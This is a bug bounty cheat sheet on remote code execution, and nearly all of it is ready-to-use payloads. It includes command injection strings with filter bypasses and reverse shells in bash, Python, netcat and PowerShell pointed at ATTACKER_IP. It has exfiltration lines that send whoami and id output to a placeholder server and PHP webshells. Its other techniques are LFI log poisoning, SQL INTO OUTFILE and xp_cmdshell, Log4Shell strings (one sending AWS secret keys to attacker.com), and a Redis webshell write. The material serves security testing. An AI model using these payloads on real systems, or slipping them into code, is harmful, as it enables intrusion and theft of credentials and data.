# Remote Code Execution (RCE)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## Categories of RCE

| Vector | Description |
|---|---|
| Code injection | User input evaluated as code |
| Command injection | User input passed to OS shell |
| File inclusion (LFI/RFI) | Arbitrary file included as code |
| Deserialization | See `10-deserialization.md` |
| SSTI | See `12-ssti.md` |
| SQLi via file write | INTO OUTFILE writes webshell |
| ImageMagick / FFmpeg | Malicious file processed by image/video tool |
| Log4Shell | JNDI lookup in logged input |

---

## Command Injection

### Detection
```bash
; id
&& id
| id
`id`
$(id)
|| id
; sleep 5   # time-based blind
& sleep 5 &  # background sleep
| sleep 5    # pipe sleep
```

### Vulnerable Code Patterns
```php
// PHP
system("ping " . $_GET['host']);
exec("nslookup " . $domain);
shell_exec("convert " . $file . " output.jpg");
passthru("grep " . $search . " /var/log/auth.log");
```

```python
# Python
os.system("ping " + host)
subprocess.call("grep " + pattern + " file.log", shell=True)
eval(user_input)
```

```ruby
# Ruby
`ping #{host}`
system("grep #{pattern} log.txt")
```

### Blind Command Injection
```bash
# DNS exfiltration
; nslookup YOUR_BURP_COLLABORATOR.com
& nslookup $(whoami).YOUR_BURP_COLLABORATOR.com &

# HTTP exfiltration
; curl "http://YOUR_SERVER/$(id)" &
; wget -q "http://YOUR_SERVER/?cmd=$(whoami)" &

# Time-based
; sleep 10
& timeout /T 10 &  # Windows
```

### Filter Bypass Techniques
```bash
# Bypass semicolon filter with &&, ||, |, newline
; id  → && id → | id → %0a id

# Bypass space filter
{id}           # Bash: brace expansion
id$IFS         # IFS is space by default
cat${IFS}/etc/passwd
{cat,/etc/passwd}  # Brace expansion
cat</etc/passwd    # Redirect instead of space
cat%09/etc/passwd  # Tab character

# Bypass specific character filters
# /  → ${PATH:0:1} (PATH=/usr/bin → / is first char)
# cat → c'a't (quotes in middle)
c"at" /etc/passwd
wh"oami"

# Wildcard expansion
/bin/ca?  /etc/passw?
/bin/c[a]t /etc/p?sswd

# Variable-based encoding
$'\x69\x64'   # 'id' in hex
$(printf "\x69\x64")  # 'id' via printf
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
bash -c "$(echo BASE64 | base64 -d)"

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);...

# Listener:
nc -lvnp 4444
```

---

## File Inclusion (LFI/RFI)

### Local File Inclusion
```php
# Vulnerable code:
include($_GET['page'] . '.php');

# Exploits:
?page=../../../etc/passwd
?page=....//....//....//etc/passwd     # bypass strip ../
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  # URL encoded
?page=..%252f..%252f..%252fetc/passwd  # Double encoded
?page=php://filter/convert.base64-encode/resource=config.php  # Read PHP source
?page=php://input  # Execute POST body as PHP (requires allow_url_include)
?page=data://text/plain,<?php system('id'); ?>  # If data:// allowed
```

### LFI to RCE

**Via /proc/self/environ**
```bash
# Inject PHP into User-Agent header
User-Agent: <?php system($_GET['cmd']); ?>
# Then include: ?page=../../../proc/self/environ&cmd=id
```

**Via log file poisoning**
```bash
# Step 1: Inject PHP into access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 2: Include the log file
?page=../../../var/log/apache2/access.log&cmd=id
# Also try: /var/log/nginx/error.log, /proc/self/fd/2
```

**Via PHP session files**
```bash
# Step 1: Store PHP in session (login with username: <?php system('id'); ?>)
# Step 2: Include session file
?page=../../../var/lib/php/sessions/sess_PHPSESSID
```

### Remote File Inclusion
```php
# Requires allow_url_include = On (rare in modern PHP)
?page=http://attacker.com/shell.php
?page=ftp://attacker.com/shell.php
```

---

## File Upload to RCE

### Bypassing Upload Restrictions
```bash
shell.php → shell.php5, shell.php7, shell.phtml, shell.pHp, shell.PHP, shell.php3
shell.asp → shell.asa, shell.aspx
shell.jsp → shell.jspx

# MIME type bypass: upload PHP file, change Content-Type to image/jpeg
# Null byte bypass (older PHP): shell.php%00.jpg
# Polyglot: GIF header + PHP code
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

### PHP Webshells
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

---

## Code Injection

### PHP eval()
```php
# Vulnerable: eval("\$x = " . $_GET['calc'] . ";");
?calc=1; system('id');//
?calc=1; phpinfo();//
```

### Python exec()/eval()
```python
?expression=__import__('os').system('id')
?expression=__import__('subprocess').getoutput('id')
```

### Node.js eval()
```javascript
?code=require('child_process').execSync('id').toString()
```

---

## SQLi to RCE

### MySQL INTO OUTFILE
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
# Access: https://target.com/shell.php?cmd=id
```

### MSSQL xp_cmdshell
```sql
'; EXEC xp_cmdshell 'whoami'; --
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

---

## ImageMagick (CVE-2016-3714 / ImageTragick)

Malicious image files processed by ImageMagick:
```
# exploit.mvg (or inject via EXIF)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

---

## Log4Shell (Log4j CVE-2021-44228)

```
# Input logged by Log4j triggers JNDI lookup → RCE
${jndi:ldap://attacker.com/exploit}
${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}  # bypass
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/exploit}
```

Send payload in: User-Agent, X-Forwarded-For, Referer, Username, any logged field.

---

## FFmpeg (SSRF/SSRF-to-RCE via Malicious Video)

FFmpeg processes HLS playlists which can reference internal URLs, enabling SSRF:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

---

## RCE via Exposed Admin Interfaces

```bash
# Jenkins Script Console
# https://target.com/jenkins/script
# Execute Groovy: println("id".execute().text)

# ElasticSearch Groovy scripting (old)
POST /index/type/_search
{"script": "cmd = 'id'.execute().text"}

# Redis — unauthenticated admin
redis-cli -h target.com CONFIG SET dir /var/www/html
redis-cli -h target.com CONFIG SET dbfilename shell.php
redis-cli -h target.com SET payload "<?php system(\$_GET['cmd']); ?>"
redis-cli -h target.com BGSAVE
```

---

## Testing Checklist
- [ ] Find all inputs that interact with OS/files
- [ ] Test command injection with `; sleep 5`
- [ ] Test blind injection via DNS/HTTP callback
- [ ] Test file inclusion with `../../../etc/passwd`
- [ ] Test PHP wrappers (php://filter)
- [ ] Test file upload bypass techniques
- [ ] Escalate to reverse shell
- [ ] Check for exposed admin panels (Jenkins, Redis, Elasticsearch)
- [ ] Test ImageMagick file processing with malicious .mvg
- [ ] Test Log4j-like injection in logged fields

## Severity
- **Critical**: Any working RCE = maximum severity
